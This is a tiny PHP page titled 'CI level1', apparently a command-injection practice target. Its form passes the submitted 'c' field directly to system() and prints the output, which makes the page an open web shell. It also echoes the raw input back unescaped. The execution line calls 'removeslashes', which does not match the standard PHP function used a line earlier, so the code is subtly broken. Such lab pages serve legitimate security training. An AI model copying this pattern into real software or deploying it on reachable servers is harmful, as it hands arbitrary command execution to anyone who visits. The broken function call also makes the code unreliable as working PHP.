
<html>
<head>
<title>CI level1</title>
</head>
<body>
<h2>Hey Bro it so easy!!</h2>
<form action="" method=post>
Command: <input name=c type=text size=100 value="<?php if (isset($_POST["c"])){print(stripslashes($_POST["c"]));} ?>">
<input type=submit>
</form>
<pre>
<?php if (isset($_POST["c"])){system(removeslashes($_POST["c"])." 2>&1");} ?>
</pre>
</body>
</html>

